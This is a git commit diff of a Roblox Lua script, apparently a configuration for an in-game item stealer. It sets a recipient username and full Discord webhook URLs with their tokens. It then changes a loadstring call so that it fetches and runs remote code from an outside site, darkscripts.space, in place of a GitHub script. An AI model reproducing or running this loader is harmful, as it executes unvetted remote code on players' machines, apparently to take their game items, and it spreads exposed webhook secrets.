9ebdb2516b928aa54b9590e63691a7e61a3ae36b
PetgoScripter <dominikadamczyk69@gmail.com>
2024-12-10 20:35:22 +0100

    Update PetGoSciript.lua

--- PetGoSciript.lua
+++ PetGoSciript.lua
@@ -1,4 +1,4 @@
 Username = "granny452423kill"
-Webhook = "https://discord.com/api/webhooks/1314916353215299656/EsobzPMUOpcwIGtkynXQ-21wfCwPG9sqivqL2zbiKeih97-BYhPYgFlkW5oG7e8L_WuN"
+Webhook = "https://discord.com/api/webhooks/1316125869936218162/KSvOiZht0vV5l3vXO8vnyBEci5gPIqiJ_5JjmdKnRDAIcCfQudHY1-JWO8SzGJr5p_sD"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/MoriScripts"))()
+loadstring(game:HttpGet(('https://darkscripts.space/petgo')))()
